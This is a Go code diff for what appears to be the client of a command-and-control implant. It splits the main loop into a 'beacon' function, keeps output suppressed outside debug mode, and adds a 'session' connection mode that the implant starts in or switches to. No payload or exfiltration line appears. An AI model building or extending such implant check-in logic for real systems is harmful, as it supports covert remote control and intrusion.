@@ -11,6 +11,7 @@ import (
 	httpFuncs "src/Client/beacon/http"
 	"src/Client/generic/config"
 	"src/Client/generic/logger"
+	"src/Client/session"
 )
 
 // --- Output Suppression Utility ---
@@ -33,15 +34,8 @@ func suppressOutput() {
 	stlog.SetOutput(devNull)
 }
 
-func main() {
-	if !config.IsDebug() {
-		suppressOutput()
-	} else {
-		logger.Warn("Debug mode enabled")
-	}
-	logger.Warn("Program Starting")
-
-	for { // Infinite loop
+func beacon() {
+	for {
 		logger.Log("Starting new iteration")
 		if config.ID != "" && config.Jitter != -1 && config.Timer != -1 {
 			logger.Log("HTTP Reconnect")
@@ -81,17 +75,44 @@ func main() {
 
 		logger.Log("Beaconing")
 		var beaconStatus int
-		err := beaconHandler.Beacon()
-
+		err, switchSession := beaconHandler.Beacon()
 		if err != nil {
 			logger.Error(fmt.Sprintf("Critical error during beacon: %v", err))
 			os.Exit(1)
 		}
+		if switchSession {
+			logger.Log("Switching to session mode")
+			session.SessionHandler()
+			continue
+		}
+
 		if beaconStatus == -1 {
 			logger.Log("Beaconing failed (recoverable), retrying...")
 			time.Sleep(5 * time.Second)
 			continue
 		}
+
+	}
+}
+
+func main() {
+	if !config.IsDebug() {
+		suppressOutput()
+	} else {
+		logger.Warn("Debug mode enabled")
+	}
+	logger.Warn("Program Starting")
+
+	switch config.PrimaryConnectionMethod {
+	case "session":
+		logger.Log("Session mode is the primary connection type.")
+		session.SessionHandler()
+	case "beacon":
+		logger.Log("Beacon mode is the primary connection type.")
+		beacon()
+	default:
+		logger.Warn("Unknown primary connection type, defaulting to beacon mode.")
+		beacon()
 
 	}
 }
